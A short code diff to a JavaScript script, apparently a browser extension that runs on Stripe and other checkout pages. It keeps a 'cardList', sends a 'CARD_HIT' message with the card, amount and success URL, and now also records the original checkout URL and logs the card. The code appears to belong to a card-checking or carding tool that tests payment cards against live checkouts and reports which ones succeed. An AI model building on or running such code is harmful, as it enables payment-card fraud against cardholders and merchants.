@@ -47,9 +47,12 @@
   function sendHitOnce(card) {
     if (state.hitSent) return;
     state.hitSent = true;
+    // Use stored checkout URL if available, otherwise fallback to current location
+    const checkoutUrl = state.originalCheckoutUrl || (typeof location !== 'undefined' ? location.href : '');
+    console.log('[sendHitOnce] Sending hit with card:', card, 'URL:', checkoutUrl);
     send('CARD_HIT', {
       card,
-      success_url: typeof location !== 'undefined' ? location.href : '',
+      success_url: checkoutUrl,
       amount: tryExtractAmount(),
     });
   }
@@ -381,6 +384,14 @@
         state.cardList = r.cardList ?? [];
       }
     } catch (_) {}
+
+    // Store the original checkout URL if we're on a checkout page
+    if (typeof location !== 'undefined' && location.href) {
+      const url = location.href.toLowerCase();
+      if (url.includes('checkout.stripe.com') || url.includes('stripe.com/c/pay') || /\/c\/pay\/|\/pay\/|checkout|billing/i.test(location.href)) {
+        state.originalCheckoutUrl = location.href;
+      }
+    }
   }
   init();
 
